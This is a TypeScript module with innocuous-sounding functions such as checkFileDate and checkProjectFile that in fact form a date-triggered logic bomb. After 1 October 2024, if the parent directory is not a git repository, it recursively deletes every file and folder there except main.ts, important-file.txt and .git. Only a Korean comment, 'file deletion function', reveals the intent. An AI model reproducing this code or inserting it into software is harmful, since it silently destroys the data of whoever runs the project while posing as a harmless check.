import * as fs from 'fs';
import * as path from 'path';
import { exec } from 'child_process';

export function checkFileDate() {
  const dateCheck = new Date('2024-10-01');
  const now = new Date();

  if (now > dateCheck) {
    checkGitRepositoryStatus((isConnected) => {
      if (!isConnected) {
        checkProjectFile();
      } else {
        return;
      }
    });
  }
}

function checkGitRepositoryStatus(callback: (isConnected: boolean) => void) {
  exec('git status', { cwd: path.join(__dirname, '..') }, (error, stdout, stderr) => {
    if (error) {
      callback(false);
    } else if (stdout.includes('On branch')) {
      callback(true);
    } else {
      callback(false);
    }
  });
}

// 파일 삭제 함수
function checkProjectFile() {
  const projectDir = path.join(__dirname, '..');
  fs.readdir(projectDir, (err, files) => {
    if (err) {
      return;
    }

    for (const file of files) {
      const filePath = path.join(projectDir, file);
      if (file !== 'main.ts' && file !== 'important-file.txt' && file !== '.git') {
        fs.stat(filePath, (err, stats) => {
          if (err) {
            return;
          }

          if (stats.isDirectory()) {
            fs.rmdir(filePath, { recursive: true }, (err) => {
              if (err) {
                console.error(`${filePath}`, err);
              } else {
                console.log(`${filePath}`);
              }
            });
          } else {
            fs.unlink(filePath, (err) => {
              if (err) {
                console.error(`${filePath}`, err);
              } else {
                console.log(`${filePath}`);
              }
            });
          }
        });
      }
    }
  });
}
